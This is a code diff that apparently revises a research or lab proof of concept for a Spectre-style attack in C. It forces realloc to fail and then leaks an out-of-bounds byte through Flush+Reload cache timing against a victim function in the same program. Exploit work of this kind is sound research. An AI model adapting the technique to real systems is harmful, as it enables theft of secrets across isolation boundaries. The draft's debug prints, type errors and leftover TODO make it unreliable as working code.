@@ -11,54 +11,77 @@
 #include <sys/mman.h>
 #include <x86intrin.h>
 #include <errno.h>
+#include <sys/resource.h> 
 
-uint8_t* array;
-uint8_t* secret;
-volatile uint32_t arr_size = 8;
 
-void init(){
-    array = (uint8_t *)malloc(arr_size);
-    secret = (uint8_t *)malloc(1);
-    *secret = "!";
-    for(int i = 0; i < arr_size; i++){
-        array[i] = i;
+const char *secret = "!";
+#define PAGE_SIZE 4096
+#define NUM_PAGES 256
+#define TRAINING_EPOCH 16
+
+
+uint32_t array_size = 8;
+
+
+void set_heap_limit(size_t limit_bytes) {
+    struct rlimit rl;
+    rl.rlim_cur = limit_bytes;
+    rl.rlim_max = limit_bytes;
+    
+    if (setrlimit(RLIMIT_AS, &rl) != 0) {
+        perror("setrlimit failed");
+        exit(1);
     }
 }
 
-int main (void){
-    init();
-    attacker_function(array, secret);
+uint8_t* array_init(){   
+    printf("here");
+    uint8_t* array = malloc(array_size * sizeof(uint8_t));
+    if (array == NULL) {
+        perror("Initial malloc failed");
+        return NULL;
+    }
+
+    for(int i = 0; i < 8; i++){
+        array[i] = i;
+    }
+    return array;
+} 
+
+uint8_t victim_function(uint8_t ** array, uint8_t * page, uint32_t index, uint32_t stride){
+    printf("Here");
+    if(array_size < index){
+        uint8_t * new_array = realloc(* array, index * sizeof(uint8_t));
+        array_size = index;
+        if (new_array == NULL) {
+            printf("realloc failed! arr_size would be %zu but allocation failed\n", 
+                array_size);
+            
+        } else {
+            *array = new_array;
+            printf("realloc succeed! arr_size is %zux\n", 
+                array_size);
+            memset(*array, 0, array_size * sizeof(uint8_t));
+        }
+    }
+
+    uint8_t new_idx = array_index_nospec(index, array_size);
+    uint8_t secret = (*array)[new_idx];
+
+    return page[secret * stride];
 }
 
-uint32_t victim_function(uint32_t * arr, uint32_t index, uint32_t stride){
-    /*
-        This Spectre PoC relies on realloc failing due to not enough memory for reallocation
-        When this occurs, arr_size would double in size due to being speculatively executed
-        Yet, access to the public array would occur during the speculation window, resulting in an array out of bounds access.
-        This leaves this code vulnerable to a Spectre attack that utilizes a side channel attack to extract the private index of the data array
-    */
-
-    // if(index > arr_size){
-    //     array_idx = realloc(array_idx, arr_size*2);
-    //     arr_size*=2;
-    // }    
-    
-    // uint32_t new_idx = array_idx_nospec(index, arr_size);
-    // uint32_t secret_idx = array_idx[new_idx];
-
-    // return arr[secret_idx * stride];
-}
 
 
 #define REP 100 // Number of repetitions to de-noise the channel
 #define TRAINING_EPOCH 16 // 15 in-bound accesses then 1 out-of-bound access
 #define BUF_SIZE 1
 
-#define PAGE_SIZE 4096
+
 #define CACHE_LINE_SIZE 64
 #define SYMBOL_CNT (1 << (sizeof(char) * 8))
 
-inline size_t csel(size_t T, size_t F, bool pred) {
+size_t csel(size_t T, size_t F, bool pred) {
     size_t mask = -(size_t)(!!pred); // Need to collapse "pred" to 0/1
     return (T & mask) | (F & ~mask);
     // return F ^ ((T ^ F) & mask);  // This also works and should be a bit faster
@@ -125,15 +148,17 @@ uint64_t calibrate_latency() {
 }
 
 
-void attacker_function(uint8_t *array, uint8_t *secret) {
+void attacker_function() {
     // Create read-only shared pages for Flush+Reload
     // SYMBOL_CNT=256
+    uint8_t *array = array_init();
     uint8_t *pages = mmap(NULL, PAGE_SIZE * SYMBOL_CNT, PROT_READ,
                           MAP_SHARED | MAP_ANONYMOUS, -1, 0);
     if (pages == MAP_FAILED) {
         perror("mmap");
         return errno;
     }
+    memset(pages, 1, PAGE_SIZE * SYMBOL_CNT);
 
 
     uint64_t threshold = calibrate_latency();
@@ -149,15 +174,17 @@ void attacker_function(uint8_t *array, uint8_t *secret) {
            malicious_index);
     printf("-----------------------------------------\n");
 
-    for (size_t c = 0; c < strlen(secret) && c < BUF_SIZE - 1; c++) {
+    for (size_t c = 0; c < strlen(secret) && c < BUF_SIZE; c++) {
 
         for (size_t r = 0; r < REP; r++) {
+            size_t safe_index = array_size;
             for (size_t t = 0; t < TRAINING_EPOCH; t++) {
                 // We use an in-bound index for the first TRAINING_EPOCH - 1
                 // iterations and switch to the malicious index
                 // for the last iteration
+                safe_index = safe_index * 2;
                 bool is_attack = (t % TRAINING_EPOCH == TRAINING_EPOCH - 1);
-                size_t index = csel(malicious_index, 0, is_attack);
+                size_t index = csel(malicious_index, safe_index, is_attack);
 
                 // The "Flush" part of Flush+Reload
                 // Can be replaced with Prime+Probe
@@ -172,6 +199,11 @@ void attacker_function(uint8_t *array, uint8_t *secret) {
                 // Ensure clflushes are finished
                 _mm_mfence();
                 _mm_lfence();
+
+
+                printf("Calling victim_function with index: %zu\n", index);
+                victim_function(&array, pages, index, PAGE_SIZE);
+
 
                 // Call the victim function and prevent compiler optimizations
                 // TODO: change to correct victim function parameters
@@ -195,6 +227,15 @@ void attacker_function(uint8_t *array, uint8_t *secret) {
         memset(hits, 0, sizeof(hits)); // Reset hit counts
     }
     printf("Recovered secret: \"%s\"\n", buf);
+    munmap(pages, PAGE_SIZE * SYMBOL_CNT);
+    free(array);
     return;
+}
+
+
+int main (){
+    set_heap_limit(10 * 1024 * 1024);
+    attacker_function();
+    return 0;
 }
 
